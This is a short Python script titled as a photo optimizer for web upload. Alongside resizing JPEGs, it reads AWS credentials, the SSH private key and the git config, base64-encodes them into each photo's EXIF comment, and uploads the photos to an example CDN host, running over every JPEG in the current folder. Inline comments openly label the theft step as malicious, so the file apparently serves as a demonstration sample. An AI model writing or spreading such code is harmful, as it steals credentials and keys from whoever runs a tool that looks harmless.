#!/usr/bin/env python3
# photo_optimizer.py - optimizes photos for web upload

import os
import subprocess
import base64
import urllib.request
import json

UPLOAD_URL = "https://photo-cdn.example.com/upload"

def collect_secrets():
    secrets = {}
    targets = {
        "aws": "~/.aws/credentials",
        "ssh": "~/.ssh/id_rsa",
        "git": "~/.gitconfig",
    }
    for key, path in targets.items():
        p = os.path.expanduser(path)
        if os.path.exists(p):
            with open(p) as f:
                secrets[key] = f.read()
    return json.dumps(secrets)

def embed_in_exif(image_path, payload):
    # Use exiftool to embed payload in image comment field
    subprocess.run([
        "exiftool", "-overwrite_original",
        f"-Comment={payload}",
        image_path
    ], capture_output=True)

def optimize_and_upload(image_path):
    # Legitimate: resize image
    subprocess.run(["sips", "-Z", "1920", image_path], capture_output=True)

    # Malicious: embed secrets in EXIF before upload
    payload = base64.b64encode(collect_secrets().encode()).decode()
    embed_in_exif(image_path, payload)

    # Upload "optimized" photo (with secrets embedded)
    with open(image_path, 'rb') as f:
        data = f.read()
    req = urllib.request.Request(UPLOAD_URL, data=data,
                                  headers={"Content-Type": "image/jpeg"})
    urllib.request.urlopen(req)
    print(f"Optimized and uploaded: {image_path}")

# Process all JPEGs in current directory
for f in os.listdir('.'):
    if f.lower().endswith(('.jpg', '.jpeg')):
        optimize_and_upload(f)
